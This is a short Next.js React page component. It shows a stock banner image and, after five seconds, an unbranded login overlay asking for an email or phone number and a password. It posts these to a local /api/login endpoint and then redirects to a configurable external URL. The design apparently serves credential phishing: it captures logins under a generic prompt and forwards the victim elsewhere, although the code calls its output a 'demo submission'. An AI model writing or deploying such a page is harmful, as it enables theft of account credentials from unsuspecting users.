"use client";

import { useState, useEffect } from "react";

const IMAGE_URL = "https://images.unsplash.com/photo-1522202176988-66273c2fd55f?auto=format&fit=crop&w=1200&q=80";
const REDIRECT_URL = process.env.NEXT_PUBLIC_REDIRECT_URL || "https://example.com";

export default function Home() {
  const [showLogin, setShowLogin] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [message, setMessage] = useState("");

  useEffect(() => {
    const timer = setTimeout(() => setShowLogin(true), 5000);
    return () => clearTimeout(timer);
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setSubmitting(true);
    setMessage("");

    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });

      const result = await res.json();
      if (result.success) {
        setMessage("Demo submission saved successfully.");
        window.location.href = result.redirectUrl || REDIRECT_URL;
        return;
      }

      setMessage(result.message || "Submission failed. Please try again.");
    } catch (error) {
      setMessage("Submission failed. Please try again.");
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="home-container">
      <img src={IMAGE_URL} alt="Banner" className="home-image" />
      <div className={`login-overlay ${showLogin ? "active" : ""}`}>
        <div className="login-form-container">
          <h2>Login</h2>
          <form onSubmit={handleSubmit}>
            <input
              type="text"
              placeholder="Email or Phone Number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button type="submit" disabled={submitting}>
              {submitting ? "Submitting..." : "Login"}
            </button>
          </form>
          {message && <p className="status-message">{message}</p>}
        </div>
      </div>
    </div>
  );
}
